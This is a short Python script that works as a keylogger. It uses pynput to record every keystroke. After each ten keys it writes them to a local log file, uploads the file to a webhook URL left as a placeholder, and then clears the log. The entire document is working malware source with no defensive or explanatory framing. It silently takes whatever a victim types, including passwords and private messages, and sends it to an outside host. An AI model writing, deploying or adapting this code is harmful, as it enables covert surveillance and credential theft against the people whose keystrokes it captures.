
import requests

from pynput.keyboard import Key, Listener 

webhook_url = "PUT_WEBHOOK_URL_HERE" # Replace with your webhook URL

count =0
keys = []

def on_press(key):
    global count, keys

    keys.append(key)
    count += 1
  
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        f.write(f"{''.join(str(key) for key in keys)}\n")
    send_file()
            



def send_file():
    with open("log.txt", "rb") as file:
        requests.post(webhook_url, files={"file": file})
    open("log.txt", "w").close()






with Listener(on_press=on_press) as listener: 
    listener.join()
